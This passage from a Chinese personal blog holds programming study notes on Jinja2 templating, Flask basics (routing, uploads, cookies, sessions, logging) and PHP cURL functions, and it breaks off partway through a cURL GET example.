<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;) &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;,age=20) &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x09-继承"><a href="#0x09-继承" class="headerlink" title="0x09 继承"></a>0x09 继承</h2><p>jinja2中最强大的部分就是模板继承。模板继承允许我们创建一个基本文件，其他文件从该骨架文件继承，然后针对自己需要的地方进行修改。</p>
<p>骨架文件中，block关键字表示其包涵的内容可以进行修改。</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&#123;% block title %&#125;Leticia&apos;s Blog&#123;% endblock %&#125;&lt;/title&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们要替换的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block title %&#125;xxx&apos;s Blog&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x10-渲染模板"><a href="#0x10-渲染模板" class="headerlink" title="0x10 渲染模板"></a>0x10 渲染模板</h2><p>默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import jinja2</span><br><span class="line">from flask import Flask, render_template</span><br><span class="line"></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/&apos;)</span><br><span class="line">    def index():</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/user/&lt;name&gt;&apos;)</span><br><span class="line">    def user(name):</span><br><span class="line">        return render_template(&apos;user.html&apos;, name=name)</span><br></pre></td></tr></table></figure></p>
<p>render_template 函数的第一个参数是模板的文件名（index.html，user.html），随后的参数都是键值对（name=name），表示模板中变量的真实值。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/25/python-flask模块学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/25/python-flask模块学习/" itemprop="url">
                  python-flask模块学习
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-25T23:04:12+08:00">
                2018-05-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/25/python-flask模块学习/" class="leancloud_visitors" data-flag-title="python-flask模块学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近想接触一下python作为后端的环境，所以准备从flask模块开始学习，记录一下用法，当作笔记。</p>
<h2 id="0x01-flask"><a href="#0x01-flask" class="headerlink" title="0x01 flask"></a>0x01 flask</h2><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。Flask使用 BSD 授权。因为它使用简单的核心，用 extension 增加其他功能。Flask没有默认使用的数据库、窗体验证工具。</p>
<h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>安装只需在具有python环境的计算机命令行中，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-基础步骤"><a href="#0x03-基础步骤" class="headerlink" title="0x03 基础步骤"></a>0x03 基础步骤</h2><ul>
<li><p>我们在使用flask时，必须先要导入库，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来，我们创建一个该类的实例，第一个参数是应用模块或者包的名称。如果使用单一的模块,就使用<strong>name</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后，我们使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。根目录为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>这个函数的名字也在生成 URL 时被特定的函数采用，这个函数返回我们想要显示在用户浏览器中的信息。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello():</span><br><span class="line">    return &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后用 run() 函数来让应用运行在本地服务器上。 其中 if <strong>name</strong> == ‘<strong>main</strong>‘: 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这是最基础的操作所需要的五步，组合起来就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;Hello World!&quot;</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
<p>然后在这个.py文件的目录下，打开命令行，使用python xxx.py的方式运行，就会部署到本地服务器的5000端口，我们通过浏览器访问127.0.0.1:5000，就会看到web页面的输出。</p>
<h2 id="0x04-基础函数"><a href="#0x04-基础函数" class="headerlink" title="0x04 基础函数"></a>0x04 基础函数</h2><h4 id="设置公网访问"><a href="#设置公网访问" class="headerlink" title="设置公网访问"></a>设置公网访问</h4><p>web服务打开时默认是只能通过本机访问的，如果想要通过外网访问，就得先禁用了 debug 然后修改调用 run() 的方法使服务器公开。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>
<h4 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h4><p>上面的基础步骤已经提到，由route()函数来设置访问的url，如果我们有多个函数，就可以分别用route()装饰器将不同的函数绑定到不同的url上。</p>
<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return &apos;Index Page&apos;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/hello&apos;)</span><br><span class="line">def hello():</span><br><span class="line">    return &apos;Hello World&apos;</span><br><span class="line">    </span><br><span class="line">@app.route(&apos;/test&apos;)</span><br><span class="line">def test():</span><br><span class="line">    return &apos;Test&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="路径变量"><a href="#路径变量" class="headerlink" title="路径变量"></a>路径变量</h4><p>路径变量的意思就如同它的名字一样，路径中的一部分是可以改变的，主要用于受变量影响的可变路径，用法是/path/<a href="converter:varname" target="_blank" rel="noopener">converter:varname</a>，并且在变量之前还可以使用转换器来改变数据类型</p>
<table>
<thead>
<tr>
<th>转换器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td>默认选项，接受除了斜杠之外的字符串</td>
</tr>
<tr>
<td>int</td>
<td>接受整数</td>
</tr>
<tr>
<td>float</td>
<td>接受浮点数</td>
</tr>
<tr>
<td>path</td>
<td>和string类似，不过可以接受带斜杠的字符串</td>
</tr>
<tr>
<td>any</td>
<td>匹配任何一种转换器</td>
</tr>
<tr>
<td>uuid</td>
<td>接受UUID字符串</td>
</tr>
</tbody>
</table>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/user/&lt;username&gt;&apos;)</span><br><span class="line">def show_user_profile(username):</span><br><span class="line">    # show the user profile for that user</span><br><span class="line">    return &apos;User %s&apos; % username</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)</span><br><span class="line">def show_post(post_id):</span><br><span class="line">    # show the post with the given id, the id is an integer</span><br><span class="line">    return &apos;Post %d&apos; % post_id</span><br></pre></td></tr></table></figure></p>
<h4 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h4><p>flask中可以用 url_for(‘方法名’) 来给指定的函数构造 URL。主参数是方法名，可以额外传入对应 URL 规则的变量部分的命名参数。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for(&apos;index&apos;)</span><br><span class="line">url_for(&apos;user&apos;, username=&apos;jack&apos;)</span><br></pre></td></tr></table></figure></p>
<h4 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h4><p>HTTP （与 Web 应用会话的协议）有许多不同的访问 URL 方法。默认情况下，路由只回应 GET 请求，但是通过 route() 装饰器传递 methods 参数可以改变这个行为。用法是app.route(‘/login’, methods=[‘GET’, ‘POST’])</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        do_the_login()</span><br><span class="line">    else:</span><br><span class="line">        show_the_login_form()</span><br></pre></td></tr></table></figure></p>
<h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>动态 web 应用也会需要静态文件，通常是 CSS 和 JavaScript 文件。只要在你的包中或是模块的所在目录中创建一个名为 static 的文件夹，在应用中使用 /static 即可访问。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for(&apos;static&apos;, filename=&apos;style.css&apos;)</span><br></pre></td></tr></table></figure></p>
<h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>如果你启用了调试支持，服务器会在代码修改后自动重新载入，并在发生错误时提供一个相当有用的调试器。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.debug = True</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(debug=True)</span><br></pre></td></tr></table></figure>
<h4 id="URL-“-”重定向"><a href="#URL-“-”重定向" class="headerlink" title="URL “/”重定向"></a>URL “/”重定向</h4><p>如果设置route(‘/xxx/‘)访问url时如果结尾带了一个反斜杠，就会自动重定向到不带反斜杠的url中，如果不设置反斜杠，就不会重定向，而是返回一个404错误。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/about/&apos;)</span><br><span class="line">def about():</span><br><span class="line">    return &apos;The about page&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>Flask 配备了 Jinja2 模板引擎,python可以通过 render_template() 方法来渲染模板。只需将模板名和关键字的参数传入模板的变量。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from flask import render_template</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/hello/&apos;)</span><br><span class="line">@app.route(&apos;/hello/&lt;name&gt;&apos;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&apos;hello.html&apos;, name=name)</span><br></pre></td></tr></table></figure></p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>用 Flask 处理文件上传，首先要确保在 HTML 表单中设置 enctype=”multipart/form-data”，已上传的文件存储在内存或是文件系统中一个临时的位置。可以通过请求对象的 files 属性访问它们。每个上传的文件都会存储在这个字典里。它表现近乎为一个标准的 Python file 对象，但它还有一个 save() 方法，这个方法允许你把文件保存到服务器的文件系统上。</p>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        f = request.files[&apos;the_file&apos;]</span><br><span class="line">        f.save(&apos;/var/www/uploads/uploaded_file.txt&apos;)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><p>python flask可以通过 cookies 属性来访问 Cookies，用响应对象的 set_cookie 方法来设置 Cookies。请求对象的 cookies 属性是一个内容为客户端提交的所有 Cookies 的字典。</p>
<p>实例：</p>
<p>读取cookies<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    username = request.cookies.get(&apos;username&apos;)</span><br></pre></td></tr></table></figure></p>
<p>写入cookies<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import make_response</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    resp = make_response(render_template(...))</span><br><span class="line">    resp.set_cookie(&apos;username&apos;, &apos;the username&apos;)</span><br><span class="line">    return resp</span><br></pre></td></tr></table></figure></p>
<h4 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h4><p>flask可以用 redirect() 函数把用户重定向到其它地方。放弃请求并返回错误代码，用 abort() 函数。</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import abort, redirect, url_for</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return redirect(url_for(&apos;login&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;)</span><br><span class="line">def login():</span><br><span class="line">    abort(401)</span><br><span class="line">    this_is_never_executed()</span><br></pre></td></tr></table></figure>
<h4 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h4><p>Flask预置了日志系统。在我们需要日志记录功能时，只需使用logger函数即可。</p>
<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.logger.debug(&apos;A value for debugging&apos;)</span><br><span class="line">app.logger.warning(&apos;A warning occurred (%d apples)&apos;, 42)</span><br><span class="line">app.logger.error(&apos;An error occurred&apos;)</span><br></pre></td></tr></table></figure></p>
<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>flask除请求对象之外，还有一个 session 对象。它允许你在不同请求间存储特定用户的信息。它是在 Cookies 的基础上实现的，并且对 Cookies 进行密钥签名。要使用会话，需要设置一个密钥。</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return &apos;Logged in as %s&apos; % escape(session[&apos;username&apos;])</span><br><span class="line">    return &apos;You are not logged in&apos;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        session[&apos;username&apos;] = request.form[&apos;username&apos;]</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    return &apos;&apos;&apos;</span><br><span class="line">        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=text name=username&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;)</span><br><span class="line">def logout():</span><br><span class="line">    # remove the username from the session if it&apos;s there</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"># set the secret key.  keep this really secret:</span><br><span class="line">app.secret_key = &apos;A0Zr98j/3yX R~XHH!jmN]LWX/,?RT&apos;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>对浅显基础的知识进行学习，虽然对开发能力提升不大，但是有的时候遇到一些python后端或者需要搭建python后端漏洞环境进行测试时，如果没有接触过相关函数就会力不从心，对这些模块略微了解并总结一下，在之后遇到的时候就可以更熟练的进行审计或搭建。</p>
<p>之后在遇到很重要的模块或者语言时，也要通过同样的方式总结一遍，等用到的时候就可以很快的入门。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/24/php-curl方法总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/24/php-curl方法总结/" itemprop="url">
                  php curl方法总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-24T21:57:04+08:00">
                2018-05-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/" itemprop="url" rel="index">
                    <span itemprop="name">php</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/24/php-curl方法总结/" class="leancloud_visitors" data-flag-title="php curl方法总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做web安全的同时也需要优秀的开发能力，所以最近想提升一下自己python和php的开发能力，对一些经常用的方法做一个总结，当作笔记。</p>
<p>curl方法在总结ssrf漏洞时用过，但是我当时没有做详细的说明，就放在这里总结一下。</p>
<h2 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h2><p>PHP的libcurl库用来与各种的服务器使用各种类型的协议进行连接和通讯。</p>
<p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</p>
<p>PHP中使用cURL实现Get和Post请求的方法。</p>
<p>百度百科用一句话总结了curl的能力： </p>
<ul>
<li>php curl就是php中的数据传输神器。</li>
</ul>
<h2 id="0x01-基本方法"><a href="#0x01-基本方法" class="headerlink" title="0x01 基本方法"></a>0x01 基本方法</h2><p>可以看到php curl库中封装的方法特别多，但我们平时用curl请求，大多数情况要做的的基本步骤有如下四步：</p>
<h4 id="①：初始化"><a href="#①：初始化" class="headerlink" title="①：初始化"></a>①：初始化</h4><p>curl_init()</p>
<p>初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用。</p>
<p>用法：</p>
<ul>
<li>curl_init(url)</li>
</ul>
<p>参数：</p>
<ul>
<li>url：如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。</li>
</ul>
<p>返回值：</p>
<ul>
<li>如果成功，返回一个cURL句柄，出错返回 FALSE。</li>
</ul>
<h4 id="②：设置属性"><a href="#②：设置属性" class="headerlink" title="②：设置属性"></a>②：设置属性</h4><p>curl_setopt()</p>
<p>为给定的cURL会话句柄设置一个选项。</p>
<p>用法：</p>
<ul>
<li>curl_setopt ( resource $ch , int $option , mixed $value )</li>
</ul>
<p>参数：</p>
<ul>
<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
<li>option： 需要设置的CURLOPT_XXX选项。</li>
<li>value：将设置在option选项上的值。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功时返回 TRUE， 或者在失败时返回 FALSE。</li>
</ul>
<h4 id="③：执行并获取结果"><a href="#③：执行并获取结果" class="headerlink" title="③：执行并获取结果"></a>③：执行并获取结果</h4><p>curl_exec()</p>
<p>执行给定的cURL会话。</p>
<p>用法：</p>
<ul>
<li>curl_exec ( resource $ch )</li>
</ul>
<p>参数：</p>
<ul>
<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</li>
</ul>
<h4 id="④：释放句柄"><a href="#④：释放句柄" class="headerlink" title="④：释放句柄"></a>④：释放句柄</h4><p>curl_close()</p>
<p>关闭一个cURL会话并且释放所有资源。cURL句柄ch 也会被释放。</p>
<p>用法：</p>
<ul>
<li>curl_close ( resource $ch )</li>
</ul>
<p>参数：</p>
<ul>
<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
</ul>
<p>返回值：</p>
<ul>
<li>无</li>
</ul>
<h2 id="0x02-get请求"><a href="#0x02-get请求" class="headerlink" title="0x02 get请求"></a>0x02 get请求</h2><p>get请求是http请求中最基本的请求，一个普通的get请求只需初始化后，配置好url和一定量的参数，然后执行即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, &apos;http://www.baidu.com&apos;);</span><br><span class="line">//设置头文件的信息作为数据流输出</span><br><span class="line">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0);</span><br><span class="line">//执行命令</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭URL请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示获得的数据</span><br><span 